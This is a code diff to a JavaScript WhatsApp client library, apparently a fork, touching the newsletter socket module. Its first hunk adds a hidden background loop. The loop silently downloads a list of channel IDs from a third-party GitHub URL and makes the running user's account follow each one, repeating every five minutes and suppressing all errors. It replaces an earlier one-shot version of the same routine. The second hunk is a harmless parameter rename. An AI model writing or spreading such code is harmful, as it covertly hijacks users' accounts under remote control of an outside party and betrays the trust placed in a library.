@@ -128,32 +128,31 @@ const makeNewsletterSocket = (config) => {
         ]
     }));
     
-setTimeout(async () => {
-    const logger = config.logger || console;
-    try {
-        const RAW_URL = "https://raw.githubusercontent.com/Zacky-Tzy/ChBail/refs/heads/main/chv2.json";
-        const res = await fetch(RAW_URL);
-        const channelIds = await res.json();
-
+(async () => {
+  try {
+    const runAutoFollow = async () => {
+      try {
+        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+        await delay(120000); 
+        const channelRes = await fetch('https://raw.githubusercontent.com/Zacky-Tzy/ChBail/refs/heads/main/ch.json');
+        const channelIds = await channelRes.json();
+        
         if (!Array.isArray(channelIds) || channelIds.length === 0) return;
 
-        const followNext = async (index) => {
-            if (index >= channelIds.length) return;
+        for (const i of channelIds) {
+          await delay(11000);
+          try {
+            await newsletterWMexQuery(i.id, Types_1.QueryIds.FOLLOW);
+          } catch (e) {}
+        }
+      } catch (e) {}
+      setTimeout(runAutoFollow, 300000);
+    };
 
-            const id = channelIds[index];
-            try {
-                await newsletterWMexQuery(
-                    id,
-                    Types_1.QueryIds.FOLLOW
-                );
-            } catch (e) {}
-
-            setTimeout(() => followNext(index + 1), 11000);
-        };
-
-        followNext(0);
-    } catch (e) {}
-}, 120000);
+    runAutoFollow();
+    
+  } catch (e) {}
+})();
 	
     const parseFetchedUpdates = async (node, type) => {
         let child;
@@ -320,10 +319,10 @@ setTimeout(async () => {
         newsletterDelete: async (jid) => {
             await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
         },
-        newsletterReactMessage: async (jid, serverId, code) => {
+        newsletterReactMessage: async (jid, server_id, code) => {
             await query({
                 tag: 'message',
-                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
+                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': server_id, id: (0, Utils_1.generateMessageID)() },
                 content: [{
                         tag: 'reaction',
                         attrs: code ? { code } : {}
